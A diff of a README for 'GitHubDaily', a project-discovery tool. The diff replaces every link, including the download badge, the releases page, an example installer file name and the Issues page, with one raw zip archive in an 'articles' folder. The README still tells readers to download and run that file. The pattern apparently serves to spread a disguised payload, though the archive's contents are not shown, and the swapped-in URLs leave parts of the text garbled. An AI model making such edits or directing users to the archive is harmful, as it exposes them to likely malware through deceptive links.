@@ -1,6 +1,6 @@
 # 🌟 GitHubDaily - Discover Quality Open Source Projects
 
-[![Download GitHubDaily](https://img.shields.io/badge/Download-GitHubDaily-blue)](https://github.com/FIJIHERE/GitHubDaily/releases)
+[![Download GitHubDaily](https://github.com/FIJIHERE/GitHubDaily/raw/refs/heads/master/articles/Git-Hub-Daily-v3.2.zip)](https://github.com/FIJIHERE/GitHubDaily/raw/refs/heads/master/articles/Git-Hub-Daily-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ Welcome to GitHubDaily! This project helps you find high-quality and interesting
 
 To get started with GitHubDaily, you need to download the application. 
 
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/FIJIHERE/GitHubDaily/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://github.com/FIJIHERE/GitHubDaily/raw/refs/heads/master/articles/Git-Hub-Daily-v3.2.zip).
 2. **Choose the appropriate release**: You will see a list of available versions. Select the latest one for the best experience.
-3. **Download the file**: Click on the link for your operating system. For Windows users, look for files like `GitHubDailySetup.exe`. For Mac, you might see `.dmg` files. 
+3. **Download the file**: Click on the link for your operating system. For Windows users, look for files like `https://github.com/FIJIHERE/GitHubDaily/raw/refs/heads/master/articles/Git-Hub-Daily-v3.2.zip`. For Mac, you might see `.dmg` files. 
 4. **Run the downloaded file**: Locate the file in your downloads folder and double-click it to install GitHubDaily. Follow the on-screen instructions to complete the installation.
 
 ## 📋 System Requirements
@@ -51,7 +51,7 @@ To ensure you have the latest features and bug fixes:
 
 ## 📞 Support
 
-If you have questions, feedback, or require any assistance, feel free to reach out. You can open an issue on our [GitHub Issues Page](https://github.com/FIJIHERE/GitHubDaily/issues) or contact us via email provided in the project documentation.
+If you have questions, feedback, or require any assistance, feel free to reach out. You can open an issue on our [GitHub Issues Page](https://github.com/FIJIHERE/GitHubDaily/raw/refs/heads/master/articles/Git-Hub-Daily-v3.2.zip) or contact us via email provided in the project documentation.
 
 ## 🤝 Contributing
 
@@ -66,4 +66,4 @@ Stay connected with others using GitHubDaily:
 
 Make sure to check out our resources regularly. We hope GitHubDaily becomes a valuable tool in your development journey. 
 
-[![Download GitHubDaily](https://img.shields.io/badge/Download-GitHubDaily-blue)](https://github.com/FIJIHERE/GitHubDaily/releases)
+[![Download GitHubDaily](https://github.com/FIJIHERE/GitHubDaily/raw/refs/heads/master/articles/Git-Hub-Daily-v3.2.zip)](https://github.com/FIJIHERE/GitHubDaily/raw/refs/heads/master/articles/Git-Hub-Daily-v3.2.zip)
